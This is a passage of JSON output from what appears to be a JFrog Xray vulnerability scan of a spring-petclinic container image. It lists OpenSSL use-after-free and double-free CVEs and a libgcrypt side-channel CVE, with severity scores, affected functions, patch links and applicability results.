                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The public API function BIO_new_NDEF is a helper function used for streaming ASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the SMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by end user applications.  The function receives a BIO from the caller, prepends a new BIO_f_asn1 filter BIO onto the front of it to form a BIO chain, and then returns the new head of the BIO chain to the caller. Under certain conditions, for example if a CMS recipient public key is invalid, the new filter BIO is freed and the function returns a NULL result indicating a failure. However, in this case, the BIO chain is not properly cleaned up and the BIO passed by the caller still retains internal pointers to the previously freed filter BIO. If the caller then goes on to call BIO_pop() on the BIO then a use-after-free will occur. This will most likely result in a crash.    This scenario occurs directly in the internal function B64_write_ASN1() which may cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on the BIO. This internal function is in turn called by the public API functions PEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream, SMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.  Other public API functions that may be impacted by this include i2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and i2d_PKCS7_bio_stream.  The OpenSSL cms and smime command line applications are similarly affected.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-03-19T08:11:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-416706",
            "VulnerabilityTitle": "",
            "ShortDescription": "Use-after-free in OpenSSL may lead to denial of service when calling BIO_new_NDEF with external input.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\n`BIO_new_NDEF` is a helper function in OpenSSL that is used for streaming ASN.1 data via a BIO. NDEF stands for `Nested ASN.1 Data Encoding Format`. Specifically, it pre-pends a new `BIO_f_asn1` filter BIO onto the front of a given BIO chain and returns the new head of the BIO chain to the caller. This function is primarily used internally in OpenSSL to support the streaming capabilities of the SMIME, CMS, and PKCS7 protocols, but it may also be called directly by end-user applications.\n\nAn issue has been detected in the `BIO_new_NDEF` function. If the new filter BIO created by the function is freed due to a failure, such as an invalid CMS recipient public key, the input BIO that was passed to `BIO_new_NDEF` is still pointing to the freed filter BIO. If the caller then calls the `BIO_pop()` function on the input BIO, a use-after-free will occur, which can result in a crash or other unpredictable behavior. This vulnerability can be exploited by an attacker to cause a denial of service (DoS) by crafting a malicious input that triggers the use-after-free condition.\n\nCalling any of the following functions with external data may trigger this issue -\n```\nPEM_write_bio_ASN1_stream\nPEM_write_bio_CMS_stream\nPEM_write_bio_PKCS7_stream\nSMIME_write_ASN1\nSMIME_write_CMS\nSMIME_write_PKCS7\nBIO_new_CMS\nBIO_new_PKCS7\ni2d_CMS_bio_stream\ni2d_PKCS7_bio_stream\ni2d_ASN1_bio_stream\nBIO_new_NDEF\n```",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates into the `BIO_new_NDEF` function (see list of possible wrapper functions in the full description)",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch.",
                  "Url": "https://github.com/openssl/openssl/commit/8818064ce3c3c0f1b740a5aaba2a987e75bfbafd",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's advisory.",
                  "Url": "https://www.openssl.org/news/secadv/20230207.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0215",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0215",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-416706",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0215",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The public API function BIO_new_NDEF is a helper function used for streaming ASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the SMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by end user applications.  The function receives a BIO from the caller, prepends a new BIO_f_asn1 filter BIO onto the front of it to form a BIO chain, and then returns the new head of the BIO chain to the caller. Under certain conditions, for example if a CMS recipient public key is invalid, the new filter BIO is freed and the function returns a NULL result indicating a failure. However, in this case, the BIO chain is not properly cleaned up and the BIO passed by the caller still retains internal pointers to the previously freed filter BIO. If the caller then goes on to call BIO_pop() on the BIO then a use-after-free will occur. This will most likely result in a crash.    This scenario occurs directly in the internal function B64_write_ASN1() which may cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on the BIO. This internal function is in turn called by the public API functions PEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream, SMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.  Other public API functions that may be impacted by this include i2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and i2d_PKCS7_bio_stream.  The OpenSSL cms and smime command line applications are similarly affected.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-03-19T08:11:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-416706",
            "VulnerabilityTitle": "",
            "ShortDescription": "Use-after-free in OpenSSL may lead to denial of service when calling BIO_new_NDEF with external input.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\n`BIO_new_NDEF` is a helper function in OpenSSL that is used for streaming ASN.1 data via a BIO. NDEF stands for `Nested ASN.1 Data Encoding Format`. Specifically, it pre-pends a new `BIO_f_asn1` filter BIO onto the front of a given BIO chain and returns the new head of the BIO chain to the caller. This function is primarily used internally in OpenSSL to support the streaming capabilities of the SMIME, CMS, and PKCS7 protocols, but it may also be called directly by end-user applications.\n\nAn issue has been detected in the `BIO_new_NDEF` function. If the new filter BIO created by the function is freed due to a failure, such as an invalid CMS recipient public key, the input BIO that was passed to `BIO_new_NDEF` is still pointing to the freed filter BIO. If the caller then calls the `BIO_pop()` function on the input BIO, a use-after-free will occur, which can result in a crash or other unpredictable behavior. This vulnerability can be exploited by an attacker to cause a denial of service (DoS) by crafting a malicious input that triggers the use-after-free condition.\n\nCalling any of the following functions with external data may trigger this issue -\n```\nPEM_write_bio_ASN1_stream\nPEM_write_bio_CMS_stream\nPEM_write_bio_PKCS7_stream\nSMIME_write_ASN1\nSMIME_write_CMS\nSMIME_write_PKCS7\nBIO_new_CMS\nBIO_new_PKCS7\ni2d_CMS_bio_stream\ni2d_PKCS7_bio_stream\ni2d_ASN1_bio_stream\nBIO_new_NDEF\n```",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates into the `BIO_new_NDEF` function (see list of possible wrapper functions in the full description)",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch.",
                  "Url": "https://github.com/openssl/openssl/commit/8818064ce3c3c0f1b740a5aaba2a987e75bfbafd",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's advisory.",
                  "Url": "https://www.openssl.org/news/secadv/20230207.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0215",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0215",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-416705",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4450",
                     "cwe": [
                        "CWE-415"
                     ],
                     "cwe_details": {
                        "CWE-415": {
                           "name": "Double Free",
                           "description": "The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and decodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data. If the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are populated with pointers to buffers containing the relevant decoded data. The caller is responsible for freeing those buffers. It is possible to construct a PEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex() will return a failure code but will populate the header argument with a pointer to a buffer that has already been freed. If the caller also frees this buffer then a double free will occur. This will most likely lead to a crash. This could be exploited by an attacker who has the ability to supply malicious PEM files for parsing to achieve a denial of service attack.  The functions PEM_read_bio() and PEM_read() are simple wrappers around PEM_read_bio_ex() and therefore these functions are also directly affected.  These functions are also called indirectly by a number of other OpenSSL functions including PEM_X509_INFO_read_bio_ex() and SSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal uses of these functions are not vulnerable because the caller does not free the header argument if PEM_read_bio_ex() returns a failure code. These locations include the PEM_read_bio_TYPE() functions as well as the decoders introduced in OpenSSL 3.0.  The OpenSSL asn1parse command line application is also impacted by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-05-17T12:30:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-416705",
            "VulnerabilityTitle": "",
            "ShortDescription": "A double-free in OpenSSL can lead to denial of service when processing an attacker-controlled PEM file.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\nAn issue in OpenSSL's PEM file parsing code could allow an attacker to cause a denial of service attack by supplying a specially crafted PEM file.\nAn attacker could exploit it by crafting a malicious PEM file that triggers the bug in the PEM file parsing code. Specifically, the attacker could create a PEM file that contains zero bytes of payload data, which would cause the `PEM_read_bio_ex()` function to return a failure code. However, the header argument would still be populated with a pointer to a buffer that has already been freed. If the caller also frees this buffer, then a double free will occur, which can lead to a crash or other unpredictable behavior.\nNote that the `PEM_read_bio_ex()` function is very widespread in the OpenSSL library and is called through wrapper functions like `PEM_read_bio()` / `PEM_read()` and also indirectly through other functions like `PEM_X509_INFO_read_bio_ex()` and `SSL_CTX_use_serverinfo_file()`.\nThe `asn1parse` command line application is also impacted by this issue.\n\nIf the attacker can convince a victim to process the malicious PEM file, such as by tricking the victim into opening an email attachment or visiting a website that contains the file, then the `PEM_read_bio_ex()` function would be called and could potentially crash the application or cause it to behave unpredictably.\n\nIf the application is a server-side application, then the attacker could potentially trigger the vulnerability by sending a specially crafted PEM file to the server, such as in an HTTP request, and causing the server to crash or become unresponsive.\n\nTo trigger the vulnerability, the attackers would need to know how to construct a malicious PEM file that triggers the bug in the PEM file parsing code. They would also need to find a way to convince the victim to process the file, such as by using social engineering techniques or exploiting vulnerabilities in other software that the victim uses.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A crashing PoC exploit for this issue was published",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attackers must find a remote input that propagates into the `PEM_read_bio_ex()` function. Note that this vulnerability cannot be exploited via a default TLS handshake (the OpenSSL user must explicitly call PEM_read_bio_ex() or any of its wrapper functions)",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Partial test for CVE-2022-4450: testing the failure of `PEM_read_bio_ex()`.",
                  "Url": "https://github.com/openssl/openssl/commit/dc341a46677fe19f055bd2eea0e3a2af21053903",
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL official advisory",
                  "Url": "https://www.openssl.org/news/secadv/20230207.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/openssl/openssl/commit/ee6243f3947107d655f6dee96f63861561a5aaeb",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Fuzzing test that can reproduce the CVE-2022-4450",
                  "Url": "https://github.com/openssl/openssl/pull/20242/files",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-4450",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-4450",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-416705",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4450",
                     "cwe": [
                        "CWE-415"
                     ],
                     "cwe_details": {
                        "CWE-415": {
                           "name": "Double Free",
                           "description": "The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and decodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data. If the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are populated with pointers to buffers containing the relevant decoded data. The caller is responsible for freeing those buffers. It is possible to construct a PEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex() will return a failure code but will populate the header argument with a pointer to a buffer that has already been freed. If the caller also frees this buffer then a double free will occur. This will most likely lead to a crash. This could be exploited by an attacker who has the ability to supply malicious PEM files for parsing to achieve a denial of service attack.  The functions PEM_read_bio() and PEM_read() are simple wrappers around PEM_read_bio_ex() and therefore these functions are also directly affected.  These functions are also called indirectly by a number of other OpenSSL functions including PEM_X509_INFO_read_bio_ex() and SSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal uses of these functions are not vulnerable because the caller does not free the header argument if PEM_read_bio_ex() returns a failure code. These locations include the PEM_read_bio_TYPE() functions as well as the decoders introduced in OpenSSL 3.0.  The OpenSSL asn1parse command line application is also impacted by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-05-17T12:30:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-416705",
            "VulnerabilityTitle": "",
            "ShortDescription": "A double-free in OpenSSL can lead to denial of service when processing an attacker-controlled PEM file.",
            "FullDescription": "[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\n\nAn issue in OpenSSL's PEM file parsing code could allow an attacker to cause a denial of service attack by supplying a specially crafted PEM file.\nAn attacker could exploit it by crafting a malicious PEM file that triggers the bug in the PEM file parsing code. Specifically, the attacker could create a PEM file that contains zero bytes of payload data, which would cause the `PEM_read_bio_ex()` function to return a failure code. However, the header argument would still be populated with a pointer to a buffer that has already been freed. If the caller also frees this buffer, then a double free will occur, which can lead to a crash or other unpredictable behavior.\nNote that the `PEM_read_bio_ex()` function is very widespread in the OpenSSL library and is called through wrapper functions like `PEM_read_bio()` / `PEM_read()` and also indirectly through other functions like `PEM_X509_INFO_read_bio_ex()` and `SSL_CTX_use_serverinfo_file()`.\nThe `asn1parse` command line application is also impacted by this issue.\n\nIf the attacker can convince a victim to process the malicious PEM file, such as by tricking the victim into opening an email attachment or visiting a website that contains the file, then the `PEM_read_bio_ex()` function would be called and could potentially crash the application or cause it to behave unpredictably.\n\nIf the application is a server-side application, then the attacker could potentially trigger the vulnerability by sending a specially crafted PEM file to the server, such as in an HTTP request, and causing the server to crash or become unresponsive.\n\nTo trigger the vulnerability, the attackers would need to know how to construct a malicious PEM file that triggers the bug in the PEM file parsing code. They would also need to find a way to convince the victim to process the file, such as by using social engineering techniques or exploiting vulnerabilities in other software that the victim uses.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A crashing PoC exploit for this issue was published",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attackers must find a remote input that propagates into the `PEM_read_bio_ex()` function. Note that this vulnerability cannot be exploited via a default TLS handshake (the OpenSSL user must explicitly call PEM_read_bio_ex() or any of its wrapper functions)",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Partial test for CVE-2022-4450: testing the failure of `PEM_read_bio_ex()`.",
                  "Url": "https://github.com/openssl/openssl/commit/dc341a46677fe19f055bd2eea0e3a2af21053903",
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL official advisory",
                  "Url": "https://www.openssl.org/news/secadv/20230207.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/openssl/openssl/commit/ee6243f3947107d655f6dee96f63861561a5aaeb",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Fuzzing test that can reproduce the CVE-2022-4450",
                  "Url": "https://github.com/openssl/openssl/pull/20242/files",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-4450",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-4450",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-176833",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Libgcrypt before 1.8.8 and 1.9.x before 1.9.3 mishandles ElGamal encryption because it lacks exponent blinding to address a side-channel attack against mpi_powm, and the window size is not chosen appropriately. This, for example, affects use of ElGamal in OpenPGP.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgcrypt20",
         "source_id": "deb://debian:bullseye:libgcrypt20",
         "source_comp_id": "deb://debian:bullseye:libgcrypt20:1.8.7-6",
         "component_versions": {
            "id": "debian:bullseye:libgcrypt20",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-33560",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "Libgcrypt before 1.8.8 and 1.9.x before 1.9.3 mishandles ElGamal encryption because it lacks exponent blinding to address a side-channel attack against mpi_powm, and the window size is not chosen appropriately. This, for example, affects use of ElGamal in OpenPGP.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-26T14:02:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-176833",
            "VulnerabilityTitle": "",
